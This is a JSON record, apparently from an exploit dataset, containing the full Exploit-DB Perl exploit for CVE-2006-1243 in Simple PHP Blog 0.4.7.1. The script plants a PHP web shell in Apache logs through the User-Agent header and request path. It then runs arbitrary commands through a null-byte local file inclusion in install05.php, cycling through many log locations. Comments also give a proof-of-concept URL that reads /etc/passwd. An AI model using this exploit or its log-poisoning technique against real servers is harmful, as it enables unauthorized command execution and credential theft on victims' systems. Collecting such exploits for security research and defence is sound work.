{
  "id": "1581",
  "title": "Simple PHP Blog 0.4.7.1 - Remote Command Execution",
  "cve": "CVE-2006-1243",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\nprint \"Simple PHP Blog <= 0.4.7.1 cmmnds xctn exploit\\r\\n\";\r\nprint \"through arbitrary local inclusion\\r\\n\";\r\nprint \"rgod rgod\\@autistici.org\\r\\n\";\r\nprint \"-> this works with magic_quotes_gpc = Off\\r\\n\\r\\n\";\r\n\r\n# short explaination:\r\n# we have this code in install05.php:\r\n# <?php\r\n#\trequire_once('scripts/sb_functions.php');\r\n#\tglobal $logged_in;\r\n#\t$logged_in = logged_in( false, false );\r\n#\r\n#\tread_config();\r\n#\r\n#\tglobal $blog_config;\r\n#\tif ( isset( $_GET[ 'blog_language' ] ) ) {\r\n#\t\t$blog_config[ 'blog_language' ] = $_GET[ 'blog_language' ];\r\n#\t}\r\n#\r\n#\trequire_once('languages/' . $blog_config[ 'blog_language' ] . '/strings.php');\r\n#\tsb_language( 'install05' );\r\n# ?>\r\n# ...\r\n#\r\n# script is not deleted after installation, so, if magic_quotes_gpc = Off,\r\n# you can include an arbitrary file from local resources, poc:\r\n#\r\n# http://[target]/[path_to_blog]/install05.php?blog_language=../../../../../../etc/passwd%00\r\n#\r\n# (breaking path through a null char)\r\n#\r\n# it seems you cannot inject php code (php tags are converted to html entities)\r\n# in SPB resources, but you can inject a shell in Apache logs, so... :\r\n#\r\n# http://[target]/[path]/install05.php?blog_language=../../../../../../var/log/httpd/access_log%00&cmd=ls%20-la\r\n\r\nsub main::urlEncode {\r\n    my ($string) = @_;\r\n    $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n    #$string# =~ tr/.//;\r\n    return $string;\r\n }\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"Usage:\\r\\n\";\r\nprint \"perl spb_0471_incl.pl SERVER PATH COMMAND\\r\\n\\r\\n\";\r\nprint \"SERVER         - Server where Simple PHP Blog is installed.\\r\\n\";\r\nprint \"PATH           - Path to Simple PHP Blog (ex: /spb/ or just /)\\r\\n\";\r\nprint \"COMMAND        - A shell command (\\\"cat ./config/password.php\\\"\\r\\n\";\r\nprint \"                 to see encrypted username & password)\\r\\n\\r\\n\";\r\nprint \"Example:\\r\\n\";\r\nprint \"perl spb_0471_incl.pl 192.168.1.3 /gbs/ ls -la\\r\\n\";\r\nexit();\r\n}\r\n\r\n$serv=$ARGV[0];\r\n$path=$ARGV[1];\r\n$cmd=\"\"; for ($i=2; $i<=$#ARGV; $i++) {$cmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n\r\nprint \"[1] Injecting some code in log files ...\\r\\n\";\r\n$CODE=\"<?php ob_clean();echo 666;passthru(\\$_GET[cmd]);echo 666;die;?>\";\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\")\r\nor die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\nprint $sock \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $sock \"User-Agent: \".$CODE.\"\\r\\n\";\r\nprint $sock \"Host: \".$serv.\"\\r\\n\";\r\nprint $sock \"Connection: close\\r\\n\\r\\n\";\r\nclose($sock);\r\n\r\n# fill with possible locations\r\nmy @paths= (\r\n\"../../../../../../../../../../var/log/httpd/access_log\",\r\n\"../../../../../../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../../../../../../../etc/httpd/logs/acces_log\",\r\n\"../../../../../../../../../../etc/httpd/logs/acces.log\",\r\n\"../../../../../../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../../../../../../etc/httpd/logs/error.log\",\r\n\"../../../../../../../../../../var/www/logs/access_log\",\r\n\"../../../../../../../../../../var/www/logs/access.log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../../../../../../var/log/apache/access_log\",\r\n\"../../../../../../../../../../var/log/apache/access.log\",\r\n\"../../../../../../../../../../var/log/access_log\",\r\n\"../../../../../../../../../../var/www/logs/error_log\",\r\n\"../../../../../../../../../../var/www/logs/error.log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../../../../../../var/log/apache/error_log\",\r\n\"../../../../../../../../../../var/log/apache/error.log\",\r\n\"../../../../../../../../../../var/log/access_log\",\r\n\"../../../../../../../../../../var/log/error_log\"\r\n);\r\n\r\n  for ($i=0; $i<=$#paths; $i++)\r\n  {\r\n    $a = $i + 2;\r\n    print \"[\".$a.\"] trying with \".$paths[$i].\"%00 for blog_language argument...\\r\\n\";\r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$serv\", PeerPort=>\"80\")\r\n    or die \"[+] Connecting ... Could not connect to host.\\n\\n\";\r\n    print $sock \"GET \".$path.\"install05.php?cmd=\".$cmd.\"&blog_language=\".urlEncode($paths[$i]).\"%00 HTTP/1.1\\r\\n\";\r\n    print $sock \"Host: \".$serv.\"\\r\\n\";\r\n    print $sock \"Connection: close\\r\\n\\r\\n\";\r\n    $out='';\r\n    while ($answer = <$sock>) {\r\n    $out.=$answer;\r\n    }\r\n    close($sock);\r\n    @temp= split /666/,$out,3;\r\n    if ($#temp>1) {print \"\\r\\nExploit succeeded...\\r\\n\".$temp[1];exit();}\r\n\r\n  }\r\n  #if you are here...\r\n  print \"\\r\\nExploit failed...\\r\\n\";\r\n\r\n# milw0rm.com [2006-03-13]",
  "url": "https://www.exploit-db.com/exploits/1581"
}